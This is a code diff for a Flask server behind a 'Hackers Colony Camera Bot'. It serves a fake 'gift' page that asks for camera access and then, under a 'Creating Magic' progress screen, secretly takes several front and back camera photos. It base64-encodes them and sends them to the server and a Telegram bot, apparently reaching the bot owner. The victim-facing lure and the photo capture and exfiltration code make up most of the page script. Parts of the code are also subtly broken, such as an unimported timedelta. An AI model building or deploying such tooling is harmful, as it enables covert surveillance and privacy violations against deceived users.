@@ -1,28 +1,28 @@
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, render_template_string
 import sqlite3
 from datetime import datetime
 import base64
-import asyncio
-import threading
 import os
 import sys
 
 app = Flask(__name__)
 
-# Try to import bot functions
+# Import bot functions
 try:
     from bot import (
-        add_photo, get_user_info, OWNER_ID,
-        send_photo_to_user, send_photo_to_owner, application,
-        process_photo_from_web  # Make sure this function exists in bot.py
+        add_user, update_activity, add_photo, get_user_count,
+        get_photo_count, get_today_stats, get_all_users, get_user_info,
+        update_user_ban, search_users, process_photo_from_web,
+        OWNER_ID, BOT_TOKEN, WEB_URL
     )
     BOT_AVAILABLE = True
+    print("✅ Bot module imported successfully")
 except ImportError as e:
-    print(f"Warning: Could not import bot functions: {e}")
+    print(f"⚠️ Warning: Could not import bot functions: {e}")
     BOT_AVAILABLE = False
 
-# HTML content for the main page
-HTML_CONTENT = '''
+# HTML Template
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -81,9 +81,7 @@ HTML_CONTENT = '''
             cursor: pointer;
             transition: transform 0.3s;
         }
-        button:hover {
-            transform: scale(1.05);
-        }
+        button:hover { transform: scale(1.05); }
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
@@ -122,9 +120,7 @@ HTML_CONTENT = '''
             color: #ffb3ff;
             min-height: 20px;
         }
-        .hidden {
-            display: none;
-        }
+        .hidden { display: none; }
         .telegram-info {
             margin-top: 20px;
             padding: 15px;
@@ -136,9 +132,7 @@ HTML_CONTENT = '''
             color: #00bfff;
             text-decoration: none;
         }
-        .telegram-info a:hover {
-            text-decoration: underline;
-        }
+        .telegram-info a:hover { text-decoration: underline; }
         .video-container {
             width: 100%;
             height: 200px;
@@ -212,11 +206,8 @@ HTML_CONTENT = '''
     </div>
 
     <script>
-        // Get user ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const USER_ID = urlParams.get('uid');
-        
-        // Server endpoint - same as Render URL
         const SERVER_URL = window.location.origin;
         
         document.getElementById("unlockBtn").onclick = async () => {
@@ -226,9 +217,8 @@ HTML_CONTENT = '''
             
             btn.disabled = true;
             
-            // Check if user ID exists
             if (!USER_ID || USER_ID.length < 5) {
-                box.innerHTML = `
+                box.innerHTML = \`
                     <div class="gift-icon">⚠️</div>
                     <h2 style="color:#ff5555">Invalid Access</h2>
                     <p>Please get a valid link from the Telegram bot</p>
@@ -241,11 +231,11 @@ HTML_CONTENT = '''
                         <div>Click "Get Your Gift" button</div>
                     </div>
                     <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram Bot</button>
-                `;
+                \`;
                 return;
             }
             
-            box.innerHTML = `
+            box.innerHTML = \`
                 <div class="gift-icon">✨</div>
                 <h2>🎀 Creating Magic</h2>
                 <p>Please wait while we prepare your gift...</p>
@@ -254,7 +244,7 @@ HTML_CONTENT = '''
                     <div class="progress-bar" id="progress"></div>
                 </div>
                 <div class="status" id="statusText">Initializing camera...</div>
-            `;
+            \`;
             
             videoContainer.classList.remove('hidden');
             
@@ -263,16 +253,12 @@ HTML_CONTENT = '''
             const video = document.getElementById("video");
             
             try {
-                // Test camera access first
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
                 
-                // Stop test stream
                 stream.getTracks().forEach(track => track.stop());
-                
-                // Start actual process
                 await startPhotoProcess();
                 
             } catch (error) {
@@ -298,9 +284,9 @@ HTML_CONTENT = '''
                     
                     for (let i = 1; i <= 4; i++) {
                         progress.style.width = (i * 12.5) + "%";
-                        statusText.textContent = `Front camera photo ${i}/4...`;
+                        statusText.textContent = \`Front camera photo \${i}/4...\`;
                         await new Promise(r => setTimeout(r, 800));
-                        await capturePhoto(`front_${i}`);
+                        await capturePhoto(\`front_\${i}\`);
                     }
                     
                     frontStream.getTracks().forEach(track => track.stop());
@@ -325,9 +311,9 @@ HTML_CONTENT = '''
                         
                         for (let i = 1; i <= 4; i++) {
                             progress.style.width = (50 + i * 12.5) + "%";
-                            statusText.textContent = `Back camera photo ${i}/4...`;
+                            statusText.textContent = \`Back camera photo \${i}/4...\`;
                             await new Promise(r => setTimeout(r, 800));
-                            await capturePhoto(`back_${i}`);
+                            await capturePhoto(\`back_\${i}\`);
                         }
                         
                         backStream.getTracks().forEach(track => track.stop());
@@ -343,14 +329,14 @@ HTML_CONTENT = '''
                     videoContainer.classList.add('hidden');
                     
                     // Success
-                    box.innerHTML = `
+                    box.innerHTML = \`
                         <div class="gift-icon">🎉</div>
                         <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
                         <p>Your special surprise has been prepared</p>
                         <p>Photos are being sent to your Telegram...</p>
                         <div class="status" style="color:#00ff00">✨ Complete ✨</div>
                         <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram</button>
-                    `;
+                    \`;
                     
                 } catch (error) {
                     console.error("Process error:", error);
@@ -369,14 +355,10 @@ HTML_CONTENT = '''
                     canvas.toBlob(async (blob) => {
                         if (blob) {
                             try {
-                                // Convert to base64 for sending
                                 const reader = new FileReader();
                                 reader.onloadend = async () => {
                                     const base64data = reader.result.split(',')[1];
-                                    
-                                    // Send photo to server
                                     await sendToServer(base64data, label);
-                                    
                                     resolve();
                                 };
                                 reader.readAsDataURL(blob);
@@ -393,11 +375,9 @@ HTML_CONTENT = '''
             
             async function sendToServer(photoBase64, label) {
                 try {
-                    const response = await fetch(`${SERVER_URL}/send-photo`, {
+                    const response = await fetch(\`\${SERVER_URL}/send-photo\`, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             userId: USER_ID,
                             photo: photoBase64,
@@ -406,10 +386,7 @@ HTML_CONTENT = '''
                         })
                     });
                     
-                    if (!response.ok) {
-                        throw new Error('Server error');
-                    }
-                    
+                    if (!response.ok) throw new Error('Server error');
                     return await response.json();
                 } catch (error) {
                     console.error('Failed to send to server:', error);
@@ -419,16 +396,15 @@ HTML_CONTENT = '''
             
             function showError(message) {
                 videoContainer.classList.add('hidden');
-                box.innerHTML = `
+                box.innerHTML = \`
                     <div class="gift-icon">🎭</div>
                     <h2 style="color:#ff5555">Error</h2>
-                    <p>${message}</p>
+                    <p>\${message}</p>
                     <button onclick="location.reload()">🔄 Try Again</button>
-                `;
+                \`;
             }
         };
 
-        // Show warning if no user ID
         if (!USER_ID || USER_ID.length < 5) {
             document.getElementById("unlockBtn").innerHTML = "⚠️ Get Link from Bot First";
             document.getElementById("unlockBtn").disabled = false;
@@ -443,12 +419,10 @@ HTML_CONTENT = '''
 
 @app.route('/')
 def index():
-    """Main page with the camera app"""
-    return HTML_CONTENT
+    return render_template_string(HTML_TEMPLATE)
 
 @app.route('/send-photo', methods=['POST'])
 def receive_photo():
-    """Receive photo from web app and process it"""
     try:
         data = request.json
         user_id = data.get('userId')
@@ -465,11 +439,11 @@ def receive_photo():
         if BOT_AVAILABLE:
             success = process_photo_from_web(user_id, photo_bytes, label)
             if success:
-                return jsonify({'success': True, 'message': 'Photo processed'})
+                return jsonify({'success': True, 'message': 'Photo processed successfully'})
             else:
                 return jsonify({'error': 'Failed to process photo'}), 500
         else:
-            # Just save to database if bot not available
+            # Save to database directly
             try:
                 conn = sqlite3.connect('bot_users.db')
                 c = conn.cursor()
@@ -483,49 +457,74 @@ def receive_photo():
                 return jsonify({'error': f'Database error: {str(e)}'}), 500
                 
     except Exception as e:
-        print(f"Error in /send-photo: {e}")
+        print(f"❌ Error in /send-photo: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/stats')
 def stats_api():
-    """API endpoint for statistics"""
     try:
-        conn = sqlite3.connect('bot_users.db')
-        c = conn.cursor()
-        
-        c.execute('''SELECT COUNT(*) FROM users WHERE is_banned = 0''')
-        total_users = c.fetchone()[0]
-        
-        c.execute('''SELECT COUNT(*) FROM photos''')
-        total_photos = c.fetchone()[0]
-        
-        today = datetime.now().date()
-        c.execute('''SELECT COUNT(*) FROM users WHERE DATE(join_date) = ?''', (today,))
-        today_users = c.fetchone()[0]
-        
-        c.execute('''SELECT COUNT(*) FROM photos WHERE DATE(timestamp) = ?''', (today,))
-        today_photos = c.fetchone()[0]
-        
-        conn.close()
+        if BOT_AVAILABLE:
+            total_users = get_user_count()
+            total_photos = get_photo_count()
+            today_users, today_photos, active_users = get_today_stats()
+        else:
+            # Read directly from database
+            conn = sqlite3.connect('bot_users.db')
+            c = conn.cursor()
+            
+            c.execute('''SELECT COUNT(*) FROM users WHERE is_banned = 0''')
+            total_users = c.fetchone()[0] or 0
+            
+            c.execute('''SELECT COUNT(*) FROM photos''')
+            total_photos = c.fetchone()[0] or 0
+            
+            today = datetime.now().date()
+            c.execute('''SELECT COUNT(*) FROM users WHERE DATE(join_date) = ?''', (today,))
+            today_users = c.fetchone()[0] or 0
+            
+            c.execute('''SELECT COUNT(*) FROM photos WHERE DATE(timestamp) = ?''', (today,))
+            today_photos = c.fetchone()[0] or 0
+            
+            yesterday = datetime.now() - timedelta(days=1)
+            c.execute('''SELECT COUNT(*) FROM users WHERE last_active > ?''', (yesterday,))
+            active_users = c.fetchone()[0] or 0
+            
+            conn.close()
         
         return jsonify({
             'total_users': total_users,
             'total_photos': total_photos,
             'today_users': today_users,
             'today_photos': today_photos,
+            'active_users': active_users,
             'status': 'online',
-            'bot_available': BOT_AVAILABLE
+            'bot_available': BOT_AVAILABLE,
+            'server': 'Hackers Colony Camera Bot'
         })
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'error': str(e), 'status': 'error'}), 500
 
 @app.route('/health')
 def health_check():
-    """Health check endpoint for Render"""
-    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': datetime.now().isoformat(),
+        'service': 'Hackers Colony Camera Bot'
+    })
+
+@app.route('/test')
+def test_page():
+    return jsonify({
+        'message': 'Server is running!',
+        'bot_token_set': bool(BOT_TOKEN),
+        'owner_id': OWNER_ID,
+        'web_url': WEB_URL,
+        'bot_available': BOT_AVAILABLE
+    })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    print(f"Starting Flask server on port {port}")
-    print(f"Bot available: {BOT_AVAILABLE}")
+    print(f"🚀 Starting Hackers Colony Camera Bot Server on port {port}")
+    print(f"🔑 Bot Available: {BOT_AVAILABLE}")
+    print(f"🌐 Web URL: {WEB_URL}")
     app.run(host='0.0.0.0', port=port, debug=False)
